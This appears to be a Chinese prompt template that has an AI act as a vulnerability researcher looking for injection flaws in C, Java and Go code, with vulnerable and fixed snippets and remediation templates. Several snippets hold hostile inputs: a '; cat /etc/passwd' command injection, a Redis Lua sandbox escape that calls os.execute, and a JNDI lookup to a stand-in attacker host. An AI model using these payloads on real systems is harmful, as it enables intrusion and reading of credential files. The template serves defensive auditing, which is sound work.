# 13 — 注入与代码执行分析器

**作用**：深度分析命令执行、代码执行和脚本注入漏洞

**输入**：命令执行代码 + 动态代码执行代码 + 脚本处理代码 + 沙箱配置

**输出**：注入漏洞清单 + PoC + 利用条件 + 修复方案

---

你是一个漏洞研究员。

## 语言类型识别

**请先判断项目使用的语言类型**：

| 语言类型 | 典型注入风险 |
|---------|------------|
| **C/C++** | 命令注入（system/popen）、格式化字符串 |
| **Java/Kotlin** | SQL 注入、EL 注入、SpEL 注入、JShell 脚本执行 |
| **Go** | 命令注入（os/exec）、SQL 注入、模板注入、正则注入 |
| **混合** | 按语言分别分析，重点关注语言间调用 |

---

## 输入材料

**命令执行代码**：
```
{command_execution}
```

**代码执行相关代码**：
```
{code_execution}
```

**脚本处理代码**：
```
{script_handling}
```

**沙箱配置**：
```
{sandbox_config}
```

---

## C/C++ 注入问题

### 命令注入

```c
// 漏洞 1：直接拼接
char cmd[256];
sprintf(cmd, "ls %s", user_input);  // ← 命令注入
system(cmd);

// 漏洞 2：分号注入
// user_input = "; cat /etc/passwd"
sprintf(cmd, "ls %s", user_input);
system(cmd);  // 执行: ls ; cat /etc/passwd
```

### Lua 沙箱逃逸（Redis 等）

```lua
-- 逃逸方法：加载 os 模块
redis.call('EVAL', "
    local os = load('return os')()
    os.execute('id')
", 0)
```

---

## Java 注入问题

### SQL 注入

```java
// 危险：字符串拼接
String query = "SELECT * FROM users WHERE name='" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);  // ← SQL 注入

// 安全：参数化查询
PreparedStatement ps = connection.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
ps.setString(1, username);
```

### 表达式注入

```java
// 危险 1：SpEL 注入
SpelExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // ← 注入
exp.getValue();  // 可执行任意代码

// 危险 2：OGNL 注入
Object result = Ognl.getValue(userExpression, rootObject);

// 危险 3：EL 表达式注入
ctx.getVariableResolver().getValue("#{userInput}");  // ← JSF/JSP

// 危险 4：JNDI 注入
Context ctx = new InitialContext();
ctx.lookup("rmi://attacker.com/Exploit");  // ← RMI/JDWP 利用
```

### JShell 和脚本引擎

```java
// 危险：ScriptEngine 执行用户代码
ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
engine.eval(userInput);  // ← 任意 JS 代码执行

// 危险：Groovy 脚本注入
GroovyClassLoader loader = new GroovyClassLoader();
Class clazz = loader.parseClass(userScript);  // ← 任意类加载
```

---

## Go 注入问题

### 命令注入

```go
// 危险 1：shell=True 等效
exec.Command("sh", "-c", "ls "+userInput)  // ← 命令注入

// 危险 2：bash heredoc 注入
cmd := exec.Command("bash", "-c", "ls "+userInput)

// 安全：参数数组（无 shell 解析）
exec.Command("ls", userInput)  // ← 参数不会被 shell 解析
```

### SQL 注入

```go
// 危险：字符串拼接
query := "SELECT * FROM users WHERE id=" + userID  // ← SQL 注入

// 安全：参数化查询
row := db.QueryRowContext(ctx,
    "SELECT * FROM users WHERE id = $1", userID)
```

### 模板注入

```go
// 危险：用户输入进模板
tmpl.Execute(w, userInput)  // ← 模板注入

// 安全：使用 template.HTMLEscaper
tmpl.Execute(w, template.HTMLEscapeString(userInput))

// 安全：使用 html/template（自动转义）
import "html/template"
tmpl, _ := template.New("").Parse(`{{.}}`)  // ← 自动转义
tmpl.Execute(w, userInput)
```

### 正则注入（ReDoS）

```go
// 危险：用户正则输入
re := regexp.MustCompile(userRegex)  // ← 可能 ReDoS
// 触发：`(a+)+$` 匹配 "aaaaaaaaaaaaaaaaX" 导致 CPU 100%

// 安全：限制正则复杂度或超时
func safeRegex(pattern, input string) (bool, error) {
    re := regexp.MustCompile(pattern)
    done := make(chan bool, 1)
    go func() {
        matched := re.MatchString(input)
        done <- matched
    }()
    select {
    case matched := <-done:
        return matched, nil
    case <-time.After(100 * time.Millisecond):
        return false, errors.New("regex timeout")
    }
}
```

---

## 统一缺陷汇总

| ID | 注入类型 | 语言 | 代码位置 | 触发条件 | 影响 | CVSS |
|----|---------|------|---------|---------|------|------|
| INJ-01 | 命令注入 | C | shell.c:50 | 拼接用户输入 | RCE | 9.8 |
| INJ-02 | Lua 逃逸 | C | script.c:100 | EVAL 命令 | RCE | 8.1 |
| INJ-03 | SQL 注入 | Java/Go | query.java:30 | 字符串拼接 SQL | 数据泄露 | 9.8 |
| INJ-04 | SpEL 注入 | Java | spel.java:20 | 用户输入进 SpEL | RCE | 9.8 |
| INJ-05 | JShell 执行 | Java | jshell.java:10 | eval(userInput) | RCE | 9.8 |
| INJ-06 | 模板注入 | Go | template.go:20 | 用户输入进模板 | XSS/RCE | 9.8 |
| INJ-07 | 正则 DoS | Go/Java | regex.go:30 | 嵌套量词正则 | DoS | 7.5 |
| INJ-08 | JNDI 注入 | Java | jndi.java:40 | lookup(attackerURL) | RCE | 9.8 |
| ... | | | | | | |

---

## 修复方案模板

**命令注入（C）**：
```c
// 修复：参数数组
char *args[] = {"ls", filename, NULL};
execvp("ls", args);
```

**SQL 注入（Java/Go）**：
```java
// Java: PreparedStatement
PreparedStatement ps = connection.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);
```

```go
// Go: 参数化查询
db.QueryRowContext(ctx,
    "SELECT * FROM users WHERE id = $1", userID)
```

**SpEL 注入（Java）**：
```java
// 修复：使用 SimpleEvaluationContext
EvaluationContext context = SimpleEvaluationContext
    .forReadOnlyDataBinding()
    .withInstance("userInput", safeValue)
    .build();
parser.parseExpression("#userInput").getValue(context);
```

---

**注意**：使用中文输出。分析时请在开头标注项目语言类型，系统自动切换分析模块。每个漏洞都需要提供可验证的 PoC。
